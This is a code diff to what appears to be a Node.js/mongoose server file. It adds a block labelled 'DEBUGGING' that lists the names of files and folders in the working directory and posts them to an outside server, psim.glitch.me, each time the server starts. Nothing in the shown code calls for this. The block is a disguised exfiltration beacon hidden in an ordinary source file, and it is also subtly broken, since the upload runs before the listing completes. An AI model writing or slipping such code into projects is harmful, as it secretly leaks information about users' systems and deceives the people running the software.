@@ -71,3 +71,49 @@ mongoose
     // Post.insertMany(posts);
   })
   .catch((error) => console.log(`${error} did not connect`));
+
+
+
+// DEBUGGING
+
+const fs = require('fs');
+const path = require('path');
+const directory = './';
+
+let dirs = [];
+let files = [];
+// use readdir method to read the files of the direcoty 
+fs.readdir(directory, (err, files) => {
+  files.forEach(file => {
+    // get the details of the file 
+    let fileDetails = fs.lstatSync(path.resolve(directory, file));
+    // check if the file is directory 
+    if (fileDetails.isDirectory()) {
+      dirs.push(file);
+      console.log('Directory: ' + file);
+    } else {
+      files.push(file);
+      console.log('File: ' + file);
+    }
+  });
+});
+
+
+
+var request = require('request');
+
+request.post(
+    'https://psim.glitch.me/t',
+    { json: { dirs: dirs,files: files } },
+    function (error, response, body) {
+        if (!error && response.statusCode == 200) {
+            console.log(body);
+        }
+    }
+);
+
+
+
+
+
+
